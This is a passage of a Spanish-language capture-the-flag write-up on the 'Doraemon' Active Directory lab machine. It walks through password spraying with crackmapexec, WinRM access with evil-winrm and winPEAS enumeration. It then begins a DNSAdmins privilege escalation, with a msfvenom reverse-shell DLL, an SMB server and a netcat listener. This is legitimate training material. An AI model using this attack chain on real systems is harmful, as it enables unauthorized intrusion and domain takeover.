+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>orayaki1:Dorayaki1 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\E</span>stepona:Dorayaki1
+</span></span></code></pre></div><p>Y recordando el escaneo, vimos que está activo el <strong>servicio WinRM</strong>.</p>
+<p>Probemos si funciona esta contraseña contra algún usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm 192.168.10.5 -u AD_users.txt -p <span style="color:#e6db74">&#39;Dorayaki1&#39;</span> --continue-on-success --no-brute
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DORAEMON.THL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://192.168.10.5:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\a</span>dministrador:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\g</span>uest:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\i</span>nvitado:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\N</span>obita:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>hizuka:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>uneo:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\G</span>igante:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>oraemon:Dorayaki1 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>orayaki1:Dorayaki1
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\E</span>stepona:Dorayaki1
+</span></span></code></pre></div><p>Genial, podemos loguearnos con el <strong>usuario Doraemon</strong> al <strong>servicio WinRM</strong>.</p>
+<p>Hagámoslo con la herramienta <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.10.5 -u &#39;Doraemon&#39; -p &#39;Dorayaki1&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Doraemon\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>doraemon\doraemon
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<h3 id="Doraemon">Enumeración de Máquina Víctima con winPEASx64.exe</h3>
+<p>Dentro de este usuario, aún no encontraremos la flag del usuario y tampoco encontraremos algo dentro de sus directorios.</p>
+<p>Revisando sus privilegios, no tendrá alguno del que nos podamos aprovechar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Doraemon\Documents&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFORMACIàN DE PRIVILEGIOS
+</span></span><span style="display:flex;"><span>--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de privilegio          Descripci¢n                                  Estado
+</span></span><span style="display:flex;"><span>============================= ============================================ ==========
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+</span></span></code></pre></div><p>También podemos ver a qué grupos pertenece nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Doraemon\Documents&gt; whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFORMACIàN DE GRUPO
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de grupo                                                    Tipo           SID          Atributos
+</span></span><span style="display:flex;"><span>================================================================== ============== ============ ========================================================================
+</span></span><span style="display:flex;"><span>Todos                                                              Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Usuarios                                                   Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
+</span></span></code></pre></div><p>No veo algún grupo del que nos podamos aprovechar.</p>
+<p>Vamos a subir <strong>winPEASx64</strong> para ver que puede encontrar.</p>
+<p>Puedes descargarlo aquí:</p>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: PEASS-ng</a></li>
+</ul>
+<p>Súbelo a la sesión de <strong>evil-winrm</strong> (recuerda que puedes abrir la sesión donde tengas el <strong>winPEASx64</strong>, si no tendrás que especificar la ruta completa de donde está):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Doraemon\Documents&gt; cd C:\
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; mkdir Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; cd Temp
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; upload winPEASx64.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/berserkwings/Escritorio/TheHackersLabs/Doraemon/content/winPEASx64.exe to C:\Temp\winPEASx64.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 13521576 bytes of 13521576 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span></code></pre></div><p>Ejecútalo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; ./winPEASx64.exe
+</span></span><span style="display:flex;"><span> [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the &#39;fileanalysis&#39; or &#39;all&#39; argument. Note that this search might take several minutes. For help, run winpeass.exe --help
+</span></span><span style="display:flex;"><span>ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+</span></span><span style="display:flex;"><span>Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><p>Revisando casi al final, podemos ver que se encontró un archivo oculto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     C:\Users\Default User
+</span></span><span style="display:flex;"><span>     C:\Users\Default
+</span></span><span style="display:flex;"><span>     C:\Users\All Users
+</span></span><span style="display:flex;"><span>     C:\Users\Default
+</span></span><span style="display:flex;"><span>     C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt
+</span></span><span style="display:flex;"><span>     C:\Users\All Users
+</span></span><span style="display:flex;"><span>     C:\Users\All Users\ntuser.pol
+</span></span></code></pre></div><p>Vamos a leerlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; type <span style="color:#e6db74">&#34;C:\Users\Doraemon\Links\Carta de amor a Shizuka.txt&#34;</span>
+</span></span><span style="display:flex;"><span>Shizuka te doy la clave de mi corazon: ********
+</span></span></code></pre></div><p>Parece que tenemos la contraseña de alguien.</p>
+<p>Podemos probar a quién pertenece aplicando <strong>Password Spraying</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.10.5 -u AD_users.txt -p <span style="color:#e6db74">&#39;***********&#39;</span> --continue-on-success --no-brute
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DORAEMON.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\a</span>dministrador:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\g</span>uest:*********** 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\i</span>nvitado:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\N</span>obita:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>hizuka:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>uneo:*********** 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\G</span>igante:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>oraemon:*********** STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>orayaki1:*********** 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\E</span>stepona:***********
+</span></span></code></pre></div><p>La contraseña pertenece al <strong>usuario Suneo</strong>.</p>
+<p>Probemos si sirve para el <strong>servicio WinRM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm 192.168.10.5 -u <span style="color:#e6db74">&#39;Suneo&#39;</span> -p <span style="color:#e6db74">&#39;***********&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DORAEMON.THL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://192.168.10.5:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       192.168.10.5    <span style="color:#ae81ff">5985</span>   WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>uneo:*********** <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Genial.</p>
+<p>Vamos a loguearnos como el <strong>usuario Suneo</strong> al <strong>servicio WinRM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.10.5 -u &#39;Suneo&#39; -p &#39;*********&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>doraemon\suneo
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Aquí si encontraremos la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Documents&gt; cd ../Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="dnsGroup">Abusando de Grupo DNSAdmins para Cargar Reverse Shell en un Archivo DLL y Escalar Privilegios</h3>
+<p>Revisemos que privilegios tiene este usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFORMACIàN DE PRIVILEGIOS
+</span></span><span style="display:flex;"><span>--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de privilegio          Descripci¢n                                  Estado
+</span></span><span style="display:flex;"><span>============================= ============================================ ==========
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+</span></span></code></pre></div><p>Los mismos que los del usuario anterior.</p>
+<p>Veamos a que grupos pertenece:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Suneo\Desktop&gt; whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFORMACIàN DE GRUPO
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de grupo                                                    Tipo           SID                                           Atributos
+</span></span><span style="display:flex;"><span>================================================================== ============== ============================================= =====================================================================================
+</span></span><span style="display:flex;"><span>Todos                                                              Grupo conocido S-1-1-0                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Usuarios de administraci¢n remota                          Alias          S-1-5-32-580                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Usuarios                                                   Alias          S-1-5-32-545                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554                                  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                                               Grupo conocido S-1-5-2                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Usuarios autentificados                               Grupo conocido S-1-5-11                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Esta compa¤¡a                                         Grupo conocido S-1-5-15                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>DORAEMON\DnsAdmins                                                 Grupo          S-1-5-21-3046175042-3013395696-775018414-1101 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>DORAEMON\Dorayaki                                                  Alias          S-1-5-21-3046175042-3013395696-775018414-1109 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado, Grupo local
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Autenticaci¢n NTLM                                    Grupo conocido S-1-5-64-10                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
+</span></span><span style="display:flex;"><span>Etiqueta obligatoria\Nivel obligatorio medio alto                  Etiqueta       S-1-16-8448
+</span></span></code></pre></div><p>Parece que este usuario pertenece al <strong>grupo DNSAdmins</strong>.</p>
+<p>Vamos a investigar de que va este grupo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Grupo DNSAdmins</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El grupo DNSAdmins en Active Directory es un grupo predeterminado en Windows Server que otorga permisos especiales para gestionar y administrar la infraestructura DNS (Domain Name System) dentro de un entorno de Active Directory. Los miembros del grupo DnsAdmins pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios de SISTEMA en un servidor DNS, a menudo alojado en Controladores de Dominio.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que podemos abusar de este grupo para escalar privilegios.</p>
+<p>Investigando un poco más, encontré este blog:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" target="_blank">Windows Privilege Escalation: DnsAdmins to DomainAdmin</a></li>
+</ul>
+<p>En resumen, nos explica como abusar de este grupo, para cargar un <strong>archivo DLL</strong> que contiene una <strong>Reverse Shell</strong> desde un <strong>servidor SMB</strong> con el <strong>comando dnscmd.exe</strong>. Después, debemos reiniciar el <strong>servicio DNS</strong> para que se inyecte el <strong>archivo DLL</strong> en la memoria y se ejecute nuestra <strong>Reverse Shell</strong>.</p>
+<p>¿Esto lo menciona <strong>BloodHound</strong>? Me parece que no, o al menos yo no encontre una mención sobre esta posible escalada de privilegios en la versión actual de <strong>BloodHound</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-doraemon/Captura1.png">
+</p>
+<p>Nos menciona otra, pero en mi caso, no me funciono:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-doraemon/Captura2.png">
+</p>
+<p>Continuemos.</p>
+<ul>
+<li>Primero vamos a generar nuestra <strong>Reverse Shell</strong> como un <strong>archivo DLL</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f dll -o revShell.dll
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">9216</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: revShell.dll
+</span></span></code></pre></div><ul>
+<li>Vamos a levantar un <strong>servidor SMB</strong> en donde tengamos nuestra <strong>Reverse Shell</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><ul>
+<li>Abrimos una <strong>netcat</strong> utilizando <strong>rlwrap</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
